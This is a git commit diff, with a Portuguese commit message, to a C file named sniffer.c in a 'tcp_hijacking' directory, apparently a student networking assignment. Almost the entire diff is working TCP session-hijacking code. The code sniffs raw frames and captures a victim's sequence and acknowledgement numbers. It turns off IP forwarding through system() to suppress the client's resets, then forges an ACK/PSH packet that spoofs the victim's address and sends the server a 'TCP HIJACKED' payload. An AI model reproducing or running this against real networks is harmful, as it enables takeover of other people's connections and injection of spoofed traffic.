02a06f5956a00a39b49234dfecbcff0fcbeca289
GuilhermeKorol <korol.guilherme@gmail.com>
2017-06-15 23:09:20 -0300

    Resetando vitima E enviando mensagem ao server :)

--- tf/tcp_hijacking/sniffer.c
+++ tf/tcp_hijacking/sniffer.c
@@ -35,6 +35,7 @@ int main(int argc, char *argv[]){
 	struct ifreq ethreq, if_mac, if_idx;
 	struct sockaddr_ll socket_address;
 	char mac_dst[6] = {0xf};
+	char mac_src[6] = {0xf};
 	short int ethertype = htons(0x0800);
 	int i, j, size, packet_size;
 	int frame_len = 0;
@@ -46,15 +47,24 @@ int main(int argc, char *argv[]){
 	unsigned char ip_src[4] = {0};
 	unsigned short port_dst = 0;
 	unsigned short port_src = 0;
+	unsigned short last_port_dst = 0;
+	unsigned short last_port_src = 0;
 	unsigned short port_vitima = 0;
 	unsigned short port_server = 0;
 	unsigned int ack = 0;
 	unsigned int seq = 0;
+	unsigned int last_ack = 0;
+	unsigned int last_seq = 0;
 
 	char packet[BUFFER_SIZE];
 	struct ether_header *eh = (struct ether_header *) packet;
 	struct ip *iphdr = (struct ip *) (packet + sizeof(struct ether_header));
 	struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ether_header) + sizeof(struct iphdr));
+
+	struct ether_header *eh_out = (struct ether_header *) buffer_out;
+	struct ip *iphdr_out = (struct ip *) (buffer_out + sizeof(struct ether_header));
+	struct tcphdr *tcp_out = (struct tcphdr *) (buffer_out + sizeof(struct ether_header) + sizeof(struct iphdr));
+	const char payload[] = {"TCP HIJACKED !!!! X_x"};
 
 
 
@@ -116,17 +126,26 @@ int main(int argc, char *argv[]){
 	eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
 	eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
 	eh->ether_type = htons(0x0800);
-	socket_address.sll_ifindex = if_idx.ifr_ifindex;
-	socket_address.sll_halen = ETH_ALEN;
+	memset(buffer_out,0,BUFFER_SIZE);
+	eh_out->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
+	eh_out->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
+	eh_out->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
+	eh_out->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
+	eh_out->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
+	eh_out->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
+	eh_out->ether_type = htons(0x0800);
 
 	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && num_envios <= 2){
 			ip_prot = buffer_in[IP_OFFSET+9];
 
 			if( ip_prot == 0x06 ) {		// TCP
 				if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
-					for(i=6;i<12;i++) {
-						mac_dst[i-6] = buffer_in[i];
-					}
+				for(i=0;i<6;i++) {
+					mac_src[i] = buffer_in[i];
+				}
+				for(i=6;i<12;i++) {
+					mac_dst[i-6] = buffer_in[i];
+				}
 				for (i = IP_OFFSET+12; i < IP_OFFSET+16; i++){
 					ip_dst[i-(IP_OFFSET+12)] = buffer_in[i];
 				}
@@ -137,25 +156,10 @@ int main(int argc, char *argv[]){
 				port_dst = buffer_in[TCP_OFFSET+2]<<8 | buffer_in[TCP_OFFSET+3];
 				seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
 				ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
-				// printf("\nIP HEADER:\n");
-				// printf("    IP source: ");
-				// for (j=0; j<4; j++){
-				// 	printf("%d ", ip_src[j]);
-				// }
-				// printf("\n    IP destination: ");
-				// for (j=0; j<4; j++) {
-				// 	printf("%d ", ip_dst[j]);
-				// }
-				// printf("\nTCP HEADER:\n");
-				// printf("    PORT source: %04x", port_src);
-				// printf("    PORT destination: %04x", port_dst);
-				// printf("\n    ACK: %x", ack);
-				// printf("\n    SEQ: %x", seq);
-				// printf("\n");
-				// if( port_dst == port_server ) { // Se o destino eh a porta do server, a porta de origem eh a da vitima.
-				printf("\n port_dst %x, port_server %d\n", port_dst, port_server);
+
+				printf("\n port_dst %d, port_server %d\n", port_dst, port_server);
 				if( port_dst == port_server ) {
-					eh->ether_dhost[0] = mac_dst[0];
+					eh->ether_dhost[0] = mac_dst[0]; //MAC source
 					eh->ether_dhost[1] = mac_dst[1];
 			    eh->ether_dhost[2] = mac_dst[2];
 			    eh->ether_dhost[3] = mac_dst[3];
@@ -196,13 +200,17 @@ int main(int argc, char *argv[]){
 
 					/* Envia pacote */
 					/* Garante que nao enviamos para o server
-					** (port_src deve ser o da vitima, ja que so "interceptamos" pacotes destinando o server...) */
+					** (port_src deve ser o da vitima, ja que so "interceptamos" pacotes destinados ao server...) */
+					system("echo 0 > /proc/sys/net/ipv4/ip_forward"); // Bloqueia possiveis pacotes de reset do cliente
 					if( tcp->th_dport == htons(port_src) ) {
-						if (sendto(fd, packet, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
-							perror("send");
-							close(fd);
-							exit(1);
+						if (num_envios > 1 ){
+							if (sendto(fd, packet, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
+								perror("send"); close(fd); exit(1); }
 						}
+						last_port_src = port_src;
+						last_port_dst = port_dst;
+						last_ack = ack;
+						last_seq = seq;
 						port_src = 0;
 						port_dst = 0;
 						ack = 0;
@@ -210,12 +218,57 @@ int main(int argc, char *argv[]){
             frame_len = 0;
 						num_envios++;
 						printf("\n Numero Envios %d\n", num_envios);
+						system("echo 0 > /proc/sys/net/ipv4/ip_forward"); // Bloqueia possiveis pacotes de reset do cliente
+						// sleep(4);
 					}
 			}
 		}
 		}
 	}
 	printf("\n Out of the loop\n");
+	// Tentar enviar daqui alguma pacote ao server
+	frame_len = 0;
+	eh_out->ether_dhost[0] = mac_dst[0];
+	eh_out->ether_dhost[1] = mac_dst[1];
+	eh_out->ether_dhost[2] = mac_dst[2];
+	eh_out->ether_dhost[3] = mac_dst[3];
+	eh_out->ether_dhost[4] = mac_dst[4];
+	eh_out->ether_dhost[5] = 0x02;
+	socket_address.sll_addr[0] = mac_dst[0];
+	socket_address.sll_addr[1] = mac_dst[1];
+	socket_address.sll_addr[2] = mac_dst[2];
+	socket_address.sll_addr[3] = mac_dst[3];
+	socket_address.sll_addr[4] = mac_dst[4];
+	socket_address.sll_addr[5] = mac_dst[5];
+	frame_len += sizeof(struct ether_header);
+
+	iphdr_out->ip_v = 4;
+	iphdr_out->ip_hl = 5;
+	packet_size = (sizeof(struct ip) + sizeof(struct tcphdr) + sizeof(payload));
+	iphdr_out->ip_len = htons(packet_size);
+	iphdr_out->ip_off = 0;
+	iphdr_out->ip_ttl = IPDEFTTL;
+	iphdr_out->ip_p = IPPROTO_TCP;
+	iphdr_out->ip_dst.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
+	iphdr_out->ip_src.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
+	iphdr_out->ip_sum = (unsigned short)in_cksum((unsigned short *)iphdr_out, sizeof(struct ip));
+	frame_len += sizeof(struct ip);
+	tcp_out->th_dport = htons(port_server);
+	tcp_out->th_sport = htons(last_port_src);
+	tcp_out->th_seq = htonl(last_seq);
+	tcp_out->th_ack = htonl(last_ack);
+	tcp_out->th_off = 5;
+	tcp_out->th_flags = TH_ACK | TH_PUSH;
+	tcp_out->th_win = htons(1200);
+	frame_len += sizeof(struct tcphdr);
+	memcpy(&buffer_out[frame_len], payload, sizeof(payload));
+	tcp_out->th_sum = trans_check(IPPROTO_TCP, buffer_out, (sizeof(struct tcphdr)+sizeof(payload)), iphdr->ip_src, iphdr->ip_dst);
+	frame_len += sizeof(payload);
+	if (sendto(fd, buffer_out, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
+		perror("send");
+		close(fd);
+		exit(1);
+	}
 	return 0;
 }
 
@@ -249,7 +302,6 @@ unsigned short in_cksum(unsigned short *addr,int len)
 */
 unsigned short trans_check(unsigned char proto, char *packet, int length, struct in_addr source_address,struct in_addr dest_address)
 {
-
 	  struct psuedohdr  {
 	  	struct in_addr source_address;
 	  	struct in_addr dest_address;
@@ -269,8 +321,7 @@ unsigned short trans_check(unsigned char proto, char *packet, int length, struct
 	      exit(1);
 	  }
 	  memcpy(psuedo_packet,&psuedohdr,sizeof(psuedohdr));
-	  memcpy((psuedo_packet + sizeof(psuedohdr)),
-	  packet,length);
+	  memcpy((psuedo_packet + sizeof(psuedohdr)),packet,length);
 	  answer = (unsigned short)in_cksum((unsigned short *)psuedo_packet,(length + sizeof(psuedohdr)));
     free(psuedo_packet);
     return answer;
